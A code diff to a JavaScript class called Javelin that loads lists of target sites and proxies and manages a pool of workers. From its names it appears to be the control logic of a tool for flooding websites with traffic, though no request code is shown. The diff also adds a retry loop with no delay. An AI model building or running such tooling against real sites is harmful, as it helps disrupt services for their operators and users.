@@ -17,6 +17,7 @@ class Javelin {
 		this.numberOfWorkers = numberOfWorkers;
 		this.sitesUrl = sitesUrl;
 		this.proxiesUrl = proxiesUrl;
+
 		this.workers = [];
     this.working = false;
     this.eventSource = new EventEmitter()
@@ -31,13 +32,13 @@ class Javelin {
     const config = await this.getSitesAndProxies();
 	
     if (!config) {
-      console.debug(`No proxy configuration. Trying for ${attemptNumber} time`);
+      console.debug(`No proxy configuration`);
 
 			if (attemptNumber === this.NUMBER_OF_ATTEMPTS) {
 				console.debug(`Number of attempts exhausted`);
 				return Promise.resolve();
 			}
-      return this.initialize(numberOfWorkers, attemptNumber + 1)
+      return this.initialize(numberOfWorkers, ++attemptNumber)
     }
 
     console.debug('Javelin is started...')
@@ -48,16 +49,14 @@ class Javelin {
   }
 
 	async getSitesAndProxies () {
-		console.debug(`Get sites and proxies... (${this.targetUpdateTimes})`);
+		while (this.working) {
 			try {
 				const [proxies, sites] = await Promise.all([this.getProxies(), this.getSites()])
 	
 				if (proxies.status !== 200 || sites.status !== 200) {
 					logError('Error while loading hosts, status code in not 200', proxies.status)
-					return null;
+					continue;
 				}
-	
-				this.targetUpdateTimes++;
 	
 				return {
 					sites: sites.data,
@@ -66,6 +65,7 @@ class Javelin {
 			} catch (e) {
 				logError('Error while loading hosts', e)
 			}
+		}
   }
 
 	updateConfiguration (configuration) {
@@ -97,23 +97,16 @@ class Javelin {
   }
 
 	setWorkers(newCount) {
-    console.debug(`Workers count ${this.numberOfWorkers} => ${newCount}`)
-    if (newCount < this.numberOfWorkers) {
-      for (let i = this.numberOfWorkers; i >= newCount; i--) {
-        this.workers[i].eventSource.removeAllListeners()
-        this.workers[i].stop()
-      }
-      this.workers = this.workers.slice(0, newCount)
-    } else {
-      while (this.workers.length < newCount) {
-        const newWorker = this.createNewWorker()
-        this.workers.push(newWorker)
-        if (this.working) {
-          newWorker.start().catch(error => {
-            console.debug('Wasnt able to start new runner:', error)
-          })
-        }
-      }
+    console.debug(`Set workers ${newCount}`)
+    
+		while (this.workers.length < newCount) {
+			const newWorker = this.createNewWorker()
+			this.workers.push(newWorker)
+			if (this.working) {
+				newWorker.start().catch(error => {
+					console.debug('Wasnt able to start new runner:', error)
+				})
+			}
     }
 
     this.numberOfWorkers = newCount
